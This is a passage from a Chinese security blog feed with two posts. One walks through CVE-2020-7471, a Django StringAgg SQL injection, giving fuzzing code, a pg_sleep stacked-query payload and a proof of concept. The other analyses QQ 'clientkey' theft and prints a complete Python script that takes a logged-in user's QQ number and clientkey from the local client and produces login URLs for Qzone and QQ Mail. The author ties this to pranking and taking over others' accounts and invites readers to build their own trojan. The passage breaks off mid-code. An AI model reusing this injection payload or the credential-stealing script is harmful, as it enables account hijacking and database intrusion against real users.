alt=""><br>记录变动和创建表结构  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py migrate</span><br><span class="line">python manage.py makemigrations test_app</span><br><span class="line">python manage.py migrate test_app</span><br></pre></td></tr></table></figure><p>下面测试漏洞如何触发，参考了别人的文章，这里按着思路来。<br>首先创建一些测试数据。<br>操作数据库可以使用django提供的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python manage.py shell</span><br><span class="line">&gt;&gt;&gt; from test_app.models import testModel</span><br><span class="line">&gt;&gt;&gt; testModel.objects.all()</span><br><span class="line">&lt;QuerySet [&lt;testModel: testModel object (1)&gt;]&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>添加数据  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; testModel.objects.create(field1=<span class="string">&quot;1&quot;</span>,field2=<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure><p>这样有些麻烦，而且我们要写的是poc，那就写一个数据初始化。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line">os.environ.setdefault(<span class="string">&quot;DJANGO_SETTINGS_MODULE&quot;</span>, <span class="string">&quot;sqlvul_project.settings&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Django 版本大于等于1.7的时候，需要加上下面两句</span></span><br><span class="line"><span class="keyword">if</span> django.VERSION &gt;= (<span class="number">1</span>, <span class="number">7</span>):<span class="comment">#自动判断版本</span></span><br><span class="line">    django.setup()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">from</span> test_app.models <span class="keyword">import</span> testModel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initdb</span>():</span></span><br><span class="line">    data = [(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;a&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;d&#x27;</span>),(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;e&#x27;</span>)]</span><br><span class="line">    <span class="keyword">for</span> field1, field2 <span class="keyword">in</span> data:</span><br><span class="line">        testModel.objects.get_or_create(field1=field1, field2=field2)</span><br></pre></td></tr></table></figure><p>数据库初始化自动添加数据，这个get_or_create()比create()好，细品。<br>接下来要找出究竟什么分隔符可以触发漏洞。<br>但要先搞明白StringAgg聚合函数的用法，直接看官方文档。<br><a href="https://docs.djangoproject.com/en/3.0/ref/contrib/postgres/aggregates/">https://docs.djangoproject.com/en/3.0/ref/contrib/postgres/aggregates/</a><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200221125726.png" alt=""><br>参考的文章使用的是annotate()分组查询，本文采用的是aggregate()聚合查询，相对简单一些，区别可以自行了解，不在本文讨论范围。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(testModel.objects.aggregate(result=StringAgg(<span class="string">&quot;field1&quot;</span>, delimiter=<span class="string">&quot;,&quot;</span>)))</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;1,1,1,2,2&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>现在可以去测试什么分隔符可以触发漏洞了，直接贴出fuzzing代码。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>():</span></span><br><span class="line">    <span class="comment"># FUZZ delimiter</span></span><br><span class="line">    error_c = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;!@#$%^&amp;*()_+=-|\\\&quot;&#x27;:;?/&gt;.&lt;,&#123;&#125;[]&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            results = testModel.objects.aggregate(result=StringAgg(<span class="string">&quot;field1&quot;</span>, delimiter=c))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            error_c.append(c)</span><br><span class="line">    print(<span class="string">&quot;[+]Fuzz漏洞分隔符：&quot;</span>,error_c)</span><br></pre></td></tr></table></figure><p>运行结果  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+]Fuzz漏洞分隔符： [<span class="string">&#x27;%&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>]</span><br></pre></td></tr></table></figure><p>结合经验很容易就知道是单引号触发了漏洞。<br>查看报错，发现是在最后的sql执行时出现了异常。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200221211220.png" alt=""><br>DEBUG模式跟进调用栈查看最后的sql语句是怎么样的。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200221211736.png" alt=""><br>处理一下语句，去掉转义。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> STRING_AGG(&quot;test_app_testmodel&quot;.&quot;field1&quot;, <span class="string">&#x27;&#x27;&#x27;) AS &quot;result&quot; FROM &quot;test_app_testmodel&quot;;</span></span><br></pre></td></tr></table></figure><p>接下来就是欢乐的构造环节。<br>在参考文章中是使用了limit来证明漏洞存在，这里利用pg_sleep()构造一个延时来证明漏洞存在。  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> STRING_AGG(&quot;test_app_testmodel&quot;.&quot;field1&quot;, <span class="string">&#x27;,&#x27;</span>) <span class="keyword">AS</span> &quot;result&quot; <span class="keyword">FROM</span> &quot;test_app_testmodel&quot;;<span class="keyword">SELECT</span> pg_sleep(<span class="number">2</span>)<span class="comment">--&#x27;) AS &quot;result&quot; FROM &quot;test_app_testmodel&quot;;</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">,<span class="string">&#x27;) AS &quot;result&quot; FROM &quot;test_app_testmodel&quot;;SELECT pg_sleep(2)--</span></span><br></pre></td></tr></table></figure><p>直接写poc。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>():</span></span><br><span class="line">    payload = <span class="string">&#x27;,\&#x27;) AS &quot;result&quot; FROM &quot;test_app_testmodel&quot;;SELECT pg_sleep(5)--&#x27;</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    print(<span class="string">&quot;[+]注入查询结果：&quot;</span>,testModel.objects.aggregate(result=StringAgg(<span class="string">&quot;field1&quot;</span>, delimiter=payload)))</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;[+]注入pg_sleep(5)后的SQL执行耗时：&quot;</span>,end - start)</span><br></pre></td></tr></table></figure><p>运行结果  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+]注入查询结果： &#123;<span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">[+]注入pg_sleep(5)后的SQL执行耗时： 5.031138181686401</span><br></pre></td></tr></table></figure><p>漏洞证明完毕。  </p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>先贴出参考并表以致敬。<br><a href="https://github.com/Saferman/CVE-2020-7471">https://github.com/Saferman/CVE-2020-7471</a><br>文中代码基于此小改。<br>本文代码<a href="https://github.com/SNCKER/CVE-2020-7471">https://github.com/SNCKER/CVE-2020-7471</a>  </p><p>随便说两句。本文的注入算是堆叠注入，原本是使用了联合查询注入union select version()，但是version()的数据并不能显示出来，所以采用了延时来证明漏洞。对漏洞的看法，个人感觉危害不大，因为在真实环境中，拥有高级搜索功能且支持用户自定义分隔符的环境还是比较少见的（或者是本人见识少）。倒是可以基于此搭建漏洞靶机，很有想法，有空再实现一下。  </p><p>若本文的说法有误或不严谨，可联系本人更正，谢谢！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前阵子搞小项目有需求把django入了个门，今天看到了个新鲜的django注入漏洞，去了解了一下，不是太复杂，跟着别人的思路做个小文章。  &lt;/p&gt;
&lt;h1 id=&quot;漏洞原因&quot;&gt;&lt;a href=&quot;#漏洞原因&quot; class=&quot;headerlink&quot; title=&quot;漏洞原因&quot;&gt;&lt;/a&gt;漏洞原因&lt;/h1&gt;&lt;p&gt;看官方的介绍。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Django 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 before 3.0.3 allows SQL Injection if untrusted data is used as a StringAgg delimiter (e.g., in Django applications that offer downloads of data as a series of rows with a user-specified column delimiter). By passing a suitably crafted delimiter to a contrib.postgres.aggregates.StringAgg instance, it was possible to break escaping and inject malicious SQL.  &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="Django" scheme="https://sncker.github.io/blog/categories/Python/Django/"/>
    
    
    <category term="Django" scheme="https://sncker.github.io/blog/tags/Django/"/>
    
    <category term="注入" scheme="https://sncker.github.io/blog/tags/%E6%B3%A8%E5%85%A5/"/>
    
    <category term="CVE" scheme="https://sncker.github.io/blog/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>QQ盗号木马原理分析</title>
    <link href="https://sncker.github.io/blog/2020/01/19/QQ%E7%9B%97%E5%8F%B7%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://sncker.github.io/blog/2020/01/19/QQ%E7%9B%97%E5%8F%B7%E6%80%9D%E8%B7%AF%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</id>
    <published>2020-01-19T09:47:00.000Z</published>
    <updated>2020-03-05T06:13:39.700Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本人在14年时就对盗号的路子有些研究，因为那时很喜欢恶搞别人。而当时最简单的就是用易语言写的发信收信钓鱼软件，门槛极低。而本文并不是研究这种钓软或鱼站的原理，因为类似的这种手段都是诱骗鱼儿直接把账号密码送给别人，所以没什么好研究的，要再研究的话我个人觉得就要深入到心理学的方面了。那么这里研究的就是那种，我明明没有在哪里输入过QQ账号密码，但就是被别人控制了，甚至改密码后不一会又中招。这里讲到的，在没有泄露QQ账号密码，QQ却被玩弄于鼓掌的技术，我就简单地叫做QQkey利用。  </p><a id="more"></a><h1 id="QQkey"><a href="#QQkey" class="headerlink" title="QQkey"></a>QQkey</h1><p>从名字不难看出QQkey到底是个什么东西。所谓QQkey就是QQ的一个临时密码，相当于第二把钥匙。有了它就有了QQ的大部分权限了。<br>这里再提到一个东西—Skey。这是本人接触的最早的关于QQkey利用的一个部分。<br>我们现在打开QQ空间登录QQ后可以看到cookie里边就有一个叫skey的键值对。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200120104531.png" alt=""><br>在14年，只要有了这个skey和对应的QQ号，就可以突破限制直接登录QQ空间。当时有一个人就写了一款skey突破利用工具，骗到了女神的skey，就可以干一些猥琐的事情。<br>至于思路就很多了。最简单的，可以用js获取cookie，也可以叫别人打开QQ空间的小助手然后把检测内容发你，内容里边就包含了cookie。<br>本人当时就很想研究其中的原理，然后写一个属于自己的木马。但限于技术水平就耽搁下来了。<br>到现在，这个方法早就失效了。但跟前面提到的,skey只属于qqkey的一部分，所以真正的毒瘤不是skey，而是clientkey。  </p><h1 id="Clientkey"><a href="#Clientkey" class="headerlink" title="Clientkey"></a>Clientkey</h1><p>可以说，clientkey的别名就是qqkey，它比skey权限更大，可以干更多的事情。<br>现在就说说为什么存在这东西吧。我们都知道腾讯有一个快速登录的功能，在登录腾讯的网页产品时使用快速登录就不用输入账号密码了。那么设计这样一个不用输入账号密码就可以登录的功能，是为了快速安全还是为了快速方便呢？<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200120111615.png" alt=""><br>首先快速登录功能的前提就是在电脑上登录了QQ，在设计这个功能时要考虑的就是web端如何与本地QQ进行通信以便获取电脑上登录的QQ。<br>在最初时腾讯是使用Activex控件来获取电脑上登录的QQ，但是必须要浏览器启用控件才行，而且ie默认是禁用Activex控件的，所以适用性不是很强。<br>后来腾讯改用在本地建立一个httpd服务来进行通信，也就是说QQ应用程序自带了一个小型的web服务。<br>我们打开一个快速登录，F12查看网络监视器，可以看到一个这样的包。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200120113038.png" alt=""><br>看到远程地址是指向了本地。然后发现本地确实在监听4301端口。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200120113540.png" alt=""><br>响应里边包含了本机登录QQ号的一些信息。  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> var_sso_uin_list=[&#123;<span class="string">&quot;uin&quot;</span>:QQ号,<span class="string">&quot;face_index&quot;</span>:<span class="number">0</span>,<span class="string">&quot;gender&quot;</span>:<span class="number">2</span>,<span class="string">&quot;nickname&quot;</span>:<span class="string">&quot;登录QQ号的名称&quot;</span>,<span class="string">&quot;client_type&quot;</span>:<span class="number">65793</span>,<span class="string">&quot;uin_flag&quot;</span>:<span class="number">55083590</span>,<span class="string">&quot;account&quot;</span>:QQ号&#125;];ptui_getuins_CB(var_sso_uin_list);</span><br></pre></td></tr></table></figure><p>接下来点击头像进行快速登录，继续观察网络连接状况。<br>发现再次请求了本地并返回cookies。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200120120146.png" alt=""><br>cookie里就包含了clientkey，然后会有一个跳转。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200120120515.png" alt=""><br>这个跳转响应中包含了许多的cookie并且返回了一个url，直接访问这个url即可等登录到目标站点。  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptui_qlogin_CB(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;https://ptlogin2.buluo.qq.com/check_sig?pttype=2&amp;uin=948375961&amp;service=jump&amp;nodirect=0&amp;ptsigx=c0dd7***省略***8393441c77b1&amp;s_url=https%3A%2F%2Fbuluo.qq.com%2F&amp;f_url=&amp;ptlang=2052&amp;ptredirect=100&amp;aid=1000101&amp;daid=371&amp;j_later=0&amp;low_login_hour=0&amp;regmaster=0&amp;pt_login_type=2&amp;pt_aid=715030901&amp;pt_aaid=0&amp;pt_light=0&amp;pt_3rd_aid=0&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们理一下这个快速登录过程。<br>首先是第一次访问本地，获取到了本地登录的QQ号，而第二次是携带QQ号去访问本地，就可以获取到对应QQ号的clientkey，这时带着clientkey和对应QQ号去请求腾讯的这个跳转页面，就可以登录到跳转的目标站点。<br>所以这个跳转就是clientkey的一个认证，通过了就可以帮你登录到目标站点。那么，我们只要拿到QQ号和对应的clientkey就可以通过这个认证跳转去登录腾讯的许多站点以及带有QQ登录的一些站点。而skey只能登录QQ空间。。。<br>为了验证这个说法，我测试了QQ空间的快速登录，把带着clientkey去请求得到的url发给朋友。然后朋友就进了我的QQ空间，为了测试权限，我的空间就多了一条“大傻逼”的说说。。。我尝试退出QQ客户端，但是链接仍然有效，我还没测试出让它失效的方法，网友都说改密码才行。  </p><p>接下来我们就去复现它。<br>说实话复现这个并不难，只要模拟会话访问就可以了。。。<br>这里贴一份github上的代码。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QQLogin</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.session = <span class="literal">None</span>      <span class="comment"># login session</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;localhost.ptlogin2.qq.com:&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://xui.ptlogin2.qq.com/cgi-bin/xlogin?proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=549000912&amp;style=22&amp;target=self&amp;s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        self.port = <span class="literal">None</span>         <span class="comment"># listen port</span></span><br><span class="line">        self.qqnumber = <span class="literal">None</span>     <span class="comment"># qqnumber</span></span><br><span class="line">        self.nickname = <span class="literal">None</span>     <span class="comment"># nickname</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Get QQ account</span></span><br><span class="line"><span class="string">    @return     true for get success</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetAccount</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;pt_local_token&#x27;</span>,<span class="string">&#x27;1234567890&#x27;</span>, domain=<span class="string">&#x27;ptlogin2.qq.com&#x27;</span>)</span><br><span class="line">        ret = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> self.port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4300</span>, <span class="number">4309</span>):     <span class="comment"># qq local server</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.headers[<span class="string">&#x27;Host&#x27;</span>] = <span class="string">&#x27;localhost.ptlogin2.qq.com:&#x27;</span> + <span class="built_in">str</span>(self.port)</span><br><span class="line">                req = self.session.get(<span class="string">&#x27;https://localhost.ptlogin2.qq.com:&#x27;</span>+<span class="built_in">str</span>(self.port) +</span><br><span class="line">                                       <span class="string">&#x27;/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.9899515903716838&amp;pt_local_tk=&#x27;</span> +</span><br><span class="line">                                       self.session.cookies[<span class="string">&#x27;pt_local_token&#x27;</span>], headers=self.headers)</span><br><span class="line">                self.qqnumber = re.search(<span class="string">r&#x27;uin&quot;:&quot;([0-9]*)&quot;&#x27;</span>, req.text).group(<span class="number">1</span>)</span><br><span class="line">                self.nickname = re.search(<span class="string">r&#x27;nickname&quot;:&quot;(.*?)&quot;&#x27;</span>, req.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                self.session.get(<span class="string">&#x27;https://localhost.ptlogin2.qq.com:&#x27;</span>+<span class="built_in">str</span>(self.port)+<span class="string">&#x27;/pt_get_st?clientuin=&#x27;</span>+self.qqnumber +</span><br><span class="line">                                <span class="string">&#x27;&amp;callback=ptui_getst_CB&amp;r=0.9899515903716838&amp;pt_local_tk=&#x27;</span>+self.session.cookies[<span class="string">&#x27;pt_local_token&#x27;</span>], headers=self.headers)</span><br><span class="line">                ret = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Get qzone login key</span></span><br><span class="line"><span class="string">    @return     login key, None for error</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LoginQzone</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.__Login(<span class="string">&#x27;pt_aid=549000912&amp;daid=5&amp;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Get qmail login key</span></span><br><span class="line"><span class="string">    @return     login key, None for error</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LoginQmail</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.__Login(<span class="string">&#x27;pt_aid=522005705&amp;daid=4&amp;u1=https%3A%2F%2Fmail.qq.com%2Fcgi-bin%2Freadtemplate%3Fcheck%3Dfalse%26t%3Dloginpage_new_jump%26vt%3Dpassport%26vm%3Dwpt%26ft%3Dloginpage%26target%3D&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Universe login method</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__Login</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.session.get(<span class="string">&#x27;https://localhost.ptlogin2.qq.com:&#x27;</span>+<span class="built_in">str</span>(self.port)+<span class="string">&#x27;/pt_get_st?clientuin=&#x27;</span>+self.qqnumber +</span><br><span class="line">                                <span class="string">&#x27;&amp;callback=ptui_getst_CB&amp;r=0.9899515903716838&amp;pt_local_tk=&#x27;</span>+self.session.cookies[<span class="string">&#x27;pt_local_token&#x27;</span>], headers=self.headers)</span><br><span class="line">            self.headers[<span class="string">&#x27;Host&#x27;</span>] = <span class="string">&#x27;ssl.ptlogin2.qq.com&#x27;</span></span><br><span class="line">            req = self.session.get(<span class="string">&#x27;https://ssl.ptlogin2.qq.com/jump?clientuin=&#x27;</span>+self.qqnumber +</span><br><span class="line">                                    <span class="string">&#x27;&amp;keyindex=9&amp;&#x27;</span>+url+<span class="string">&#x27;&amp;pt_local_tk=&#x27;</span> +self.session.cookies[<span class="string">&#x27;pt_local_token&#x27;</span>]+<span class="string">&#x27;&amp;pt_3rd_aid=0&amp;ptopt=1&amp;style=40&#x27;</span>, headers=self.headers)</span><br><span class="line">            <span class="keyword">return</span> re.search(<span class="string">r&quot;_CB\(&#x27;0&#x27;, &#x27;(.*?)&#x27;&quot;</span>, req.text).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    obj = QQLogin()</span><br><span class="line">    obj.GetAccount()</span><br><span class="line">    print(<span class="string">&#x27;QQKey:&#x27;</span> + obj.session.cookies.get_dict()[<span class="string">&#x27;clientkey&#x27;</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Cookie: &#x27;</span> + (<span class="string">&#x27;; &#x27;</span>.join([<span class="string">&#x27;=&#x27;</span>.join(item) <span class="keyword">for</span> item <span class="keyword">in</span> obj.session.cookies.get_dict().items()])))</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">input</span>(<span class="string">&#x27;Auto get url?(y/n)&#x27;</span>)==<span class="string">&#x27;y&#x27;</span>):</span><br><span class="line">        print(<span class="string">&#x27;Qzone:&#x27;</span>)</span><br><span class="line">        print(obj.LoginQzone())</span><br><span class="line">        print(<span class="string">&#x27;Qmail:&#x27;</span>)</span><br><span class="line">        print(obj.LoginQmail())</span><br></pre></td></tr></table></figure><p>这里说几点：  </p><ol><li>第一次访问本地的pt_local_tk参数需要和cookie中的pt_local_token相同  </li><li>请求本地时要带有 <a href="https://xui.ptlogin2.qq.com/">https://xui.ptlogin2.qq.com/</a> 这个域的Referer  </li><li>本地QQ监听的端口是4300-4308，因为端口有可能被占用，然后奇数说明是https，而偶数则是http，但现在腾讯已经不用http了，所以我前面抓到的包是4301端口  </li></ol><p>好了，现在是不是很兴奋想去制作自己的盗号木马了。<br>然而在19年年底腾讯已经做出了限制。这个方法已经不适用了。本人在做复现时，网上的脚本全部都跑不了。用postman做模拟请求时，一个一模一样的包发送过去没有响应。抓包工具一开，快速登录就失效。后来在一篇文章中了解到腾讯在QQProtect.dll中加入了来源检测，也不说具体是什么。跟别人聊一下又说有HTTP双向认证，TLS指纹，证书锁定，以目前技术水平真过不了，而且还不确定是哪种限制。<br>但我仍然写了一个爬虫，用selenium来模拟浏览器访问。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 